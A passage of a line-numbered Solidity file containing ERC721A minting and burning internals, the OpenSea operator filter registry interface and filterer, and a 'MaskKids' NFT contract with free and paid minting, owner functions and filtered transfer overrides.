1048             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1049 
1050             // Updates:
1051             // - `address` to the owner.
1052             // - `startTimestamp` to the timestamp of minting.
1053             // - `burned` to `false`.
1054             // - `nextInitialized` to `quantity == 1`.
1055             _packedOwnerships[startTokenId] = _packOwnershipData(
1056                 to,
1057                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1058             );
1059 
1060             uint256 toMasked;
1061             uint256 end = startTokenId + quantity;
1062 
1063             // Use assembly to loop and emit the `Transfer` event for gas savings.
1064             // The duplicated `log4` removes an extra check and reduces stack juggling.
1065             // The assembly, together with the surrounding Solidity code, have been
1066             // delicately arranged to nudge the compiler into producing optimized opcodes.
1067             assembly {
1068                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1069                 toMasked := and(to, _BITMASK_ADDRESS)
1070                 // Emit the `Transfer` event.
1071                 log4(
1072                     0, // Start of data (0, since no data).
1073                     0, // End of data (0, since no data).
1074                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1075                     0, // `address(0)`.
1076                     toMasked, // `to`.
1077                     startTokenId // `tokenId`.
1078                 )
1079 
1080                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1081                 // that overflows uint256 will make the loop run out of gas.
1082                 // The compiler will optimize the `iszero` away for performance.
1083                 for {
1084                     let tokenId := add(startTokenId, 1)
1085                 } iszero(eq(tokenId, end)) {
1086                     tokenId := add(tokenId, 1)
1087                 } {
1088                     // Emit the `Transfer` event. Similar to above.
1089                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1090                 }
1091             }
1092             if (toMasked == 0) revert MintToZeroAddress();
1093 
1094             _currentIndex = end;
1095         }
1096         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1097     }
1098 
1099     /**
1100      * @dev Mints `quantity` tokens and transfers them to `to`.
1101      *
1102      * This function is intended for efficient minting only during contract creation.
1103      *
1104      * It emits only one {ConsecutiveTransfer} as defined in
1105      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1106      * instead of a sequence of {Transfer} event(s).
1107      *
1108      * Calling this function outside of contract creation WILL make your contract
1109      * non-compliant with the ERC721 standard.
1110      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1111      * {ConsecutiveTransfer} event is only permissible during contract creation.
1112      *
1113      * Requirements:
1114      *
1115      * - `to` cannot be the zero address.
1116      * - `quantity` must be greater than 0.
1117      *
1118      * Emits a {ConsecutiveTransfer} event.
1119      */
1120     function _mintERC2309(address to, uint256 quantity) internal virtual {
1121         uint256 startTokenId = _currentIndex;
1122         if (to == address(0)) revert MintToZeroAddress();
1123         if (quantity == 0) revert MintZeroQuantity();
1124         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1125 
1126         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1127 
1128         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1129         unchecked {
1130             // Updates:
1131             // - `balance += quantity`.
1132             // - `numberMinted += quantity`.
1133             //
1134             // We can directly add to the `balance` and `numberMinted`.
1135             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1136 
1137             // Updates:
1138             // - `address` to the owner.
1139             // - `startTimestamp` to the timestamp of minting.
1140             // - `burned` to `false`.
1141             // - `nextInitialized` to `quantity == 1`.
1142             _packedOwnerships[startTokenId] = _packOwnershipData(
1143                 to,
1144                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1145             );
1146 
1147             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1148 
1149             _currentIndex = startTokenId + quantity;
1150         }
1151         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1152     }
1153 
1154     /**
1155      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1156      *
1157      * Requirements:
1158      *
1159      * - If `to` refers to a smart contract, it must implement
1160      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1161      * - `quantity` must be greater than 0.
1162      *
1163      * See {_mint}.
1164      *
1165      * Emits a {Transfer} event for each mint.
1166      */
1167     function _safeMint(
1168         address to,
1169         uint256 quantity,
1170         bytes memory _data
1171     ) internal virtual {
1172         _mint(to, quantity);
1173 
1174         unchecked {
1175             if (to.code.length != 0) {
1176                 uint256 end = _currentIndex;
1177                 uint256 index = end - quantity;
1178                 do {
1179                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1180                         revert TransferToNonERC721ReceiverImplementer();
1181                     }
1182                 } while (index < end);
1183                 // Reentrancy protection.
1184                 if (_currentIndex != end) revert();
1185             }
1186         }
1187     }
1188 
1189     /**
1190      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1191      */
1192     function _safeMint(address to, uint256 quantity) internal virtual {
1193         _safeMint(to, quantity, '');
1194     }
1195 
1196     // =============================================================
1197     //                        BURN OPERATIONS
1198     // =============================================================
1199 
1200     /**
1201      * @dev Equivalent to `_burn(tokenId, false)`.
1202      */
1203     function _burn(uint256 tokenId) internal virtual {
1204         _burn(tokenId, false);
1205     }
1206 
1207     /**
1208      * @dev Destroys `tokenId`.
1209      * The approval is cleared when the token is burned.
1210      *
1211      * Requirements:
1212      *
1213      * - `tokenId` must exist.
1214      *
1215      * Emits a {Transfer} event.
1216      */
1217     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1218         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1219 
1220         address from = address(uint160(prevOwnershipPacked));
1221 
1222         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1223 
1224         if (approvalCheck) {
1225             // The nested ifs save around 20+ gas over a compound boolean condition.
1226             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1227                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1228         }
1229 
1230         _beforeTokenTransfers(from, address(0), tokenId, 1);
1231 
1232         // Clear approvals from the previous owner.
1233         assembly {
1234             if approvedAddress {
1235                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1236                 sstore(approvedAddressSlot, 0)
1237             }
1238         }
1239 
1240         // Underflow of the sender's balance is impossible because we check for
1241         // ownership above and the recipient's balance can't realistically overflow.
1242         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1243         unchecked {
1244             // Updates:
1245             // - `balance -= 1`.
1246             // - `numberBurned += 1`.
1247             //
1248             // We can directly decrement the balance, and increment the number burned.
1249             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1250             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1251 
1252             // Updates:
1253             // - `address` to the last owner.
1254             // - `startTimestamp` to the timestamp of burning.
1255             // - `burned` to `true`.
1256             // - `nextInitialized` to `true`.
1257             _packedOwnerships[tokenId] = _packOwnershipData(
1258                 from,
1259                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1260             );
1261 
1262             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1263             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1264                 uint256 nextTokenId = tokenId + 1;
1265                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1266                 if (_packedOwnerships[nextTokenId] == 0) {
1267                     // If the next slot is within bounds.
1268                     if (nextTokenId != _currentIndex) {
1269                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1270                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1271                     }
1272                 }
1273             }
1274         }
1275 
1276         emit Transfer(from, address(0), tokenId);
1277         _afterTokenTransfers(from, address(0), tokenId, 1);
1278 
1279         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1280         unchecked {
1281             _burnCounter++;
1282         }
1283     }
1284 
1285     // =============================================================
1286     //                     EXTRA DATA OPERATIONS
1287     // =============================================================
1288 
1289     /**
1290      * @dev Directly sets the extra data for the ownership data `index`.
1291      */
1292     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1293         uint256 packed = _packedOwnerships[index];
1294         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1295         uint256 extraDataCasted;
1296         // Cast `extraData` with assembly to avoid redundant masking.
1297         assembly {
1298             extraDataCasted := extraData
1299         }
1300         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1301         _packedOwnerships[index] = packed;
1302     }
1303 
1304     /**
1305      * @dev Called during each token transfer to set the 24bit `extraData` field.
1306      * Intended to be overridden by the cosumer contract.
1307      *
1308      * `previousExtraData` - the value of `extraData` before transfer.
1309      *
1310      * Calling conditions:
1311      *
1312      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1313      * transferred to `to`.
1314      * - When `from` is zero, `tokenId` will be minted for `to`.
1315      * - When `to` is zero, `tokenId` will be burned by `from`.
1316      * - `from` and `to` are never both zero.
1317      */
1318     function _extraData(
1319         address from,
1320         address to,
1321         uint24 previousExtraData
1322     ) internal view virtual returns (uint24) {}
1323 
1324     /**
1325      * @dev Returns the next extra data for the packed ownership data.
1326      * The returned result is shifted into position.
1327      */
1328     function _nextExtraData(
1329         address from,
1330         address to,
1331         uint256 prevOwnershipPacked
1332     ) private view returns (uint256) {
1333         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1334         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1335     }
1336 
1337     // =============================================================
1338     //                       OTHER OPERATIONS
1339     // =============================================================
1340 
1341     /**
1342      * @dev Returns the message sender (defaults to `msg.sender`).
1343      *
1344      * If you are writing GSN compatible contracts, you need to override this function.
1345      */
1346     function _msgSenderERC721A() internal view virtual returns (address) {
1347         return msg.sender;
1348     }
1349 
1350     /**
1351      * @dev Converts a uint256 to its ASCII string decimal representation.
1352      */
1353     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1354         assembly {
1355             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1356             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1357             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1358             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1359             let m := add(mload(0x40), 0xa0)
1360             // Update the free memory pointer to allocate.
1361             mstore(0x40, m)
1362             // Assign the `str` to the end.
1363             str := sub(m, 0x20)
1364             // Zeroize the slot after the string.
1365             mstore(str, 0)
1366 
1367             // Cache the end of the memory to calculate the length later.
1368             let end := str
1369 
1370             // We write the string from rightmost digit to leftmost digit.
1371             // The following is essentially a do-while loop that also handles the zero case.
1372             // prettier-ignore
1373             for { let temp := value } 1 {} {
1374                 str := sub(str, 1)
1375                 // Write the character to the pointer.
1376                 // The ASCII index of the '0' character is 48.
1377                 mstore8(str, add(48, mod(temp, 10)))
1378                 // Keep dividing `temp` until zero.
1379                 temp := div(temp, 10)
1380                 // prettier-ignore
1381                 if iszero(temp) { break }
1382             }
1383 
1384             let length := sub(end, str)
1385             // Move the pointer 32 bytes leftwards to make room for the length.
1386             str := sub(str, 0x20)
1387             // Store the length.
1388             mstore(str, length)
1389         }
1390     }
1391 }
1392 
1393 
1394 interface IOperatorFilterRegistry {
1395     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1396     function register(address registrant) external;
1397     function registerAndSubscribe(address registrant, address subscription) external;
1398     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1399     function unregister(address addr) external;
1400     function updateOperator(address registrant, address operator, bool filtered) external;
1401     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1402     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1403     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1404     function subscribe(address registrant, address registrantToSubscribe) external;
1405     function unsubscribe(address registrant, bool copyExistingEntries) external;
1406     function subscriptionOf(address addr) external returns (address registrant);
1407     function subscribers(address registrant) external returns (address[] memory);
1408     function subscriberAt(address registrant, uint256 index) external returns (address);
1409     function copyEntriesOf(address registrant, address registrantToCopy) external;
1410     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1411     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1412     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1413     function filteredOperators(address addr) external returns (address[] memory);
1414     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1415     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1416     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1417     function isRegistered(address addr) external returns (bool);
1418     function codeHashOf(address addr) external returns (bytes32);
1419 }
1420 
1421 
1422 /**
1423  * @title  OperatorFilterer
1424  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1425  *         registrant's entries in the OperatorFilterRegistry.
1426  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1427  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1428  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1429  */
1430 abstract contract OperatorFilterer {
1431     error OperatorNotAllowed(address operator);
1432 
1433     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1434         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1435 
1436     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1437         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1438         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1439         // order for the modifier to filter addresses.
1440         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1441             if (subscribe) {
1442                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1443             } else {
1444                 if (subscriptionOrRegistrantToCopy != address(0)) {
1445                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1446                 } else {
1447                     OPERATOR_FILTER_REGISTRY.register(address(this));
1448                 }
1449             }
1450         }
1451     }
1452 
1453     modifier onlyAllowedOperator(address from) virtual {
1454         // Check registry code length to facilitate testing in environments without a deployed registry.
1455         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1456             // Allow spending tokens from addresses with balance
1457             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1458             // from an EOA.
1459             if (from == msg.sender) {
1460                 _;
1461                 return;
1462             }
1463             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1464                 revert OperatorNotAllowed(msg.sender);
1465             }
1466         }
1467         _;
1468     }
1469 
1470     modifier onlyAllowedOperatorApproval(address operator) virtual {
1471         // Check registry code length to facilitate testing in environments without a deployed registry.
1472         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1473             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1474                 revert OperatorNotAllowed(operator);
1475             }
1476         }
1477         _;
1478     }
1479 }
1480 
1481 /**
1482  * @title  DefaultOperatorFilterer
1483  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1484  */
1485 abstract contract TheOperatorFilterer is OperatorFilterer {
1486     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1487 
1488     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1489 }
1490 
1491 
1492 contract MaskKids is ERC721A, TheOperatorFilterer {
1493 
1494     address public owner;
1495 
1496     uint256 public maxSupply = 1111;
1497 
1498     address public maskCoin;
1499 
1500     uint256 public cost;
1501 
1502     uint256 public maxFreeTx= 2;
1503 
1504     mapping(address => uint256) _numForFree;
1505 
1506     mapping(uint256 => uint256) _numMinted;
1507 
1508     uint256 private maxPerTx;
1509 
1510     function mint_mask(uint256 amount) payable public {
1511         require(totalSupply() + amount <= maxSupply);
1512         if (msg.value == 0) {
1513             _freemints(amount);
1514         } else {
1515             require(amount <= maxPerTx);
1516             require(msg.value >= amount * cost);
1517             _safeMint(msg.sender, amount);
1518         }
1519     }
1520 
1521     function _freemints(uint256 amount) internal {
1522         require(amount == 1 
1523             && _numMinted[block.number] < FreeNum() 
1524             && _numForFree[tx.origin] < maxFreeTx );
1525             _numForFree[tx.origin]++;
1526             _numMinted[block.number]++;
1527         _safeMint(msg.sender, 1);
1528     }
1529 
1530     function team_mint_mask(address rec, uint256 amount) public onlyOwner {
1531         _safeMint(rec, amount);
1532     }
1533     
1534     modifier onlyOwner {
1535         require(owner == msg.sender);
1536         _;
1537     }
1538 
1539     constructor() ERC721A("Mask Kids", "MK") {
1540         owner = msg.sender;
1541         maxPerTx = 20;
1542         cost = 0.002 ether;
1543     }
1544 
1545     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1546         return string(abi.encodePacked("ipfs://QmWddLrMgCUPqYPjnr4HUgtUyPoBK94Ja7hXHY1c7mnkUQ/", _toString(tokenId), ".json"));
1547     }
1548 
1549     function setMaxFreePerAddr(uint256 maxTx, uint256 maxS) external onlyOwner {
1550         maxFreeTx = maxTx;
1551         maxSupply = maxS;
1552     }
1553 
1554     function FreeNum() internal returns (uint256){
1555         return (maxSupply - totalSupply()) / 12;
1556     }
1557 
1558     function withdraw() external onlyOwner {
1559         payable(msg.sender).transfer(address(this).balance);
1560     }
1561 
1562     /////////////////////////////
1563     // OPENSEA FILTER REGISTRY 
1564     /////////////////////////////
1565 
1566     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1567         super.setApprovalForAll(operator, approved);
1568     }
1569 
1570     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1571         super.approve(operator, tokenId);
1572     }
1573 
1574     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1575         super.transferFrom(from, to, tokenId);
1576     }
1577 
1578     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1579         super.safeTransferFrom(from, to, tokenId);
1580     }
1581 
1582     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1583         public
1584         payable
1585         override
1586         onlyAllowedOperator(from)
1587     {
1588         super.safeTransferFrom(from, to, tokenId, data);
1589     }
1590 }